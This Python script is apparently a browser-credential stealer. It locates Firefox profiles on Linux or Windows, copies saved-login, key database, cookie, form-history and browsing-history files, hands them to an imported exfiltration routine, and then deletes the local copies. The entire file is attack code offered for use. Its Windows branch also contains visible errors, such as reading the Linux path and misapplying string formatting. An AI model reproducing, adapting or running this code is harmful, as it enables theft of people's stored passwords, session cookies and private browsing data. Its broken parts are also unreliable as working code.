
import shutil
import os,sys
from pathlib import Path
from exfiltration import exfiltrate

linux_path = '/home/' + os.getlogin() + '/.mozilla/firefox/' #firefox path for linux
linux_exist = Path(linux_path) #check to see if firefox exists on a linux system 
dst = os.getcwd() #gets current path to copy files to
file_list = ['logins.json','key4.db','cookies.sqlite','formhistory.sqlite','storage.sqlite','places.sqlite','key3.db','cert9.db'] #list of files to copy

def cleanup(input_files):
    print("[*] Deleting files")
    for rm in input_files:
        file_exist = Path(rm)
        if file_exist.is_file():
            os.remove(rm)
            print("[*] " + rm + " Deleted")
        else:
            print("[!] " + rm + " File Not Found")

#copy login data password file cookies form history storage and web history from firefox dir
print("[*] Detecting Operating System: " + os.name)
if os.name == 'nt':
    windows_path = os.path.normpath(r"%s\AppData\Roaming\Mozilla\Firefox\Profiles"%(os.environ['USERPROFILE']))
    windows_exist = Path(windows_path) #check to see if firefox exists on a windows system
    if windows_exist.is_dir():
        files = os.listdir(linux_path) #add folders to list
        for i in files:
            if len(i) > 20:
                store = i #add folders to list
                #loop over files and check if path exists then only try to copy file
                for x in file_list:
                    file_path = os.path.normpath(r"{}\AppData\Roaming\Mozilla\Firefox\Profiles\{}\{}").format(os.environ['USERPROFILE'],files[0],x)
                    file_exist = Path(file_path)
                    if file_exist.is_file():
                        shutil.copy(file_path,dst)
                        print("[!] " + x + " Copied Successfully")
#else run on linux
else:
    if linux_exist.is_dir():
        files = os.listdir(linux_path) #add folders to list
        for i in files:
            if len(i) > 20:
                store = i
                #loop over files and check if path exists then only try to copy file
                for x in file_list:
                    file_path = '/home/' + os.getlogin() + '/.mozilla/firefox/' + store + '/' + x
                    file_exist = Path(file_path)
                    if file_exist.is_file():
                        shutil.copy(file_path,dst)
                        print("[!] " + x + " Copied Successfully")
                        
exfil = input("[?] Do you want to exfiltrate data: Y/N? ")
if exfil.upper() == "N":
    print("[!] Goodbye!")
    sys.exit()

elif exfil.upper() == "Y":
    exfiltrate(file_list)
    cleanup(file_list)
